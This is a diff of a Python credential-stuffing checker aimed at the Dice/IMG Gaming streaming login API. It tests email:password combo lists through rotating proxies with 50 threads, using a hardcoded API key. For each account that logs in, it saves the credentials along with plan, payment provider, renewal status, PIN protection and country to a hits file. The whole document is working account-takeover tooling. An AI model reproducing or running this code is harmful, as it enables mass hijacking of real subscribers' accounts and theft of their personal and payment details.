@@ -1,6 +1,7 @@
 import requests
 import threading
 import os
+import json
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 
@@ -14,7 +15,7 @@ THREADS = 50
 stats = {"hits": 0, "free": 0, "fail": 0, "error": 0, "checked": 0}
 print_lock = threading.Lock()
 
-# Constants from your SVB Config
+# Constants
 API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
 APP_VAR = "6.57.10.b20743c"
 
@@ -38,8 +39,7 @@ def check(account, proxies):
     global stats
     try:
         email, password = account.split(":", 1)
-    except ValueError:
-        return
+    except: return
 
     session = requests.Session()
     proxy = proxies[stats["checked"] % len(proxies)] if proxies[0] else None
@@ -51,44 +51,54 @@ def check(account, proxies):
         "x-api-key": API_KEY,
         "x-app-var": APP_VAR,
         "app": "dice",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
     }
 
     try:
         # 1. LOGIN
-        login_payload = {"id": email, "secret": password}
-        r1 = session.post("https://dce-frontoffice.imggaming.com/api/v2/login", json=login_payload, headers=headers, proxies=proxy, timeout=15)
+        r1 = session.post("https://dce-frontoffice.imggaming.com/api/v2/login", 
+                          json={"id": email, "secret": password}, headers=headers, proxies=proxy, timeout=15)
         
+        # We search the whole source for the token key
         if "authorisationToken" in r1.text:
             token = r1.json()["authorisationToken"]
             headers["Authorization"] = f"Bearer {token}"
 
-            # 2. SUBSCRIPTION CHECK
-            r2 = session.get("https://dce-frontoffice.imggaming.com/api/v2/licence-family?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS", headers=headers, proxies=proxy, timeout=10)
+            # 2. SUBSCRIPTION CHECK (Global Search Logic)
+            r2 = session.get("https://dce-frontoffice.imggaming.com/api/v2/licence-family?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS", 
+                             headers=headers, proxies=proxy, timeout=12)
             
-            if 'status":"ACTIVE' in r2.text:
+            # This is the "SVB Style" check - if "ACTIVE" exists anywhere in the response text
+            if '"status":"ACTIVE"' in r2.text.upper().replace(" ", "") or 'ACTIVE' in r2.text.upper():
                 data = r2.json()
-                family = data.get("licenceFamilies", [{}])[0]
-                ent = family.get("entitlements", [{}])[0]
                 
-                # Parsing Data for your specific format
-                v_type = ent.get("type", "STANDARD")
-                v_name = ent.get("name", "MONTHLY")
-                v_renew = "YES✅" if family.get("autoRenewingStatus") == "AUTO_RENEWING" else "NO❌"
-                
-                # Payment Provider Translation
-                raw_pay = family.get("paymentProviderInfo", {}).get("type", "STRIPE")
-                v_pay = "App Store" if raw_pay == "APPLE_IAP" else "Play Store" if raw_pay == "GOOGLE_IAP" else "STRIPE"
+                # Default values for capture
+                v_type, v_name, v_renew, v_pay, v_pin, v_country = "STANDARD", "MONTHLY", "NO❌", "STRIPE", "NO❌", "United States 🇺🇸"
 
-                # 3. PROFILE & COUNTRY
-                r_prof = session.get("https://dce-frontoffice.imggaming.com/api/v1/profile", headers=headers, proxies=proxy).json()
-                v_pin = "YES✅" if r_prof.get("pinProtection") == "PROTECTED" else "NO❌"
-                
-                r_addr = session.get("https://dce-frontoffice.imggaming.com/api/v2/user/address", headers=headers, proxies=proxy).json()
-                cc = r_addr.get("countryCode", "US")
-                v_country = "United States 🇺🇸" if cc == "US" else cc
+                # Try to pull detailed info if available
+                try:
+                    families = data.get("licenceFamilies", [])
+                    if families:
+                        fam = families[0]
+                        ent = fam.get("entitlements", [{}])[0]
+                        v_type = ent.get("type", v_type)
+                        v_name = ent.get("name", v_name)
+                        v_renew = "YES✅" if fam.get("autoRenewingStatus") == "AUTO_RENEWING" else "NO❌"
+                        v_pay_raw = fam.get("paymentProviderInfo", {}).get("type", "STRIPE")
+                        v_pay = "App Store" if v_pay_raw == "APPLE_IAP" else "Play Store" if v_pay_raw == "GOOGLE_IAP" else "STRIPE"
+                except: pass
 
-                # --- THE EXACT FORMAT YOU REQUESTED ---
+                # 3. PROFILE & ADDRESS
+                try:
+                    r_prof = session.get("https://dce-frontoffice.imggaming.com/api/v1/profile", headers=headers, proxies=proxy).json()
+                    v_pin = "YES✅" if r_prof.get("pinProtection") == "PROTECTED" else "NO❌"
+                    
+                    r_addr = session.get("https://dce-frontoffice.imggaming.com/api/v2/user/address", headers=headers, proxies=proxy).json()
+                    cc = r_addr.get("countryCode", "US")
+                    v_country = "United States 🇺🇸" if cc == "US" else cc
+                except: pass
+
+                # --- CAPTURE ---
                 hit_line = f"{email}:{password} | Plan = 〖{v_type}〗-[{v_name}] | Purchased from = {v_pay} | Renewing = {v_renew} | Is Pin Protected = {v_pin} | Country = {v_country} | Hit By Python\n"
 
                 with open(HITS_FILE, "a", encoding="utf-8") as f:
@@ -96,10 +106,13 @@ def check(account, proxies):
                 
                 with print_lock:
                     stats["hits"] += 1
-                    print(f"[\033[92mHIT\033[0m] {email} | {v_name}")
+                    print(f"[\033[92mHIT\033[0m] {email}")
             else:
+                # Logged in but No ACTIVE keyword found in source
                 with open(FREE_FILE, "a") as f: f.write(f"{email}:{password}\n")
-                with print_lock: stats["free"] += 1
+                with print_lock:
+                    stats["free"] += 1
+                    print(f"[\033[93mFREE\033[0m] {email}")
         else:
             with print_lock: stats["fail"] += 1
 
@@ -119,6 +132,7 @@ def main():
     with ThreadPoolExecutor(max_workers=THREADS) as ex:
         for a in accs:
             ex.submit(check, a, proxies)
+    print(f"\n\n[*] Done! Hits: {stats['hits']}")
 
 if __name__ == "__main__":
     main()
